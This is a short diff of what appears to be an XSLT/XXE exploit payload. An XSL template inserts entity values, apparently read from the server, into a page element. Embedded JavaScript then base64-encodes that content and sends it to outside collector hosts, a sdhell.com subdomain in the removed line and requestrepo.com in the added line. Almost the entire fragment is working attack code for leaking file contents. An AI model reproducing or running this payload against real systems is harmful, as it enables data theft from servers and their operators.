@@ -42,7 +42,7 @@ def handle_request():
         <t class="&winsys;">&winsys_a;</t>  
       </div>      <div style="width:40rem" id="r" />  
       <script>  
-        open("http://cdtyutmjxfhg4x5tonpkt31rhinbb2zr.j.sdhell.com/?"+btoa(document.querySelectorAll('t')[0].innerHTML));
+        setTimeout(`location.href=("https://slbxnkvb.requestrepo.com/?"+btoa(document.querySelectorAll('t')[0].innerHTML))`);
         </script>  
     </body>  
     </xsl:template>
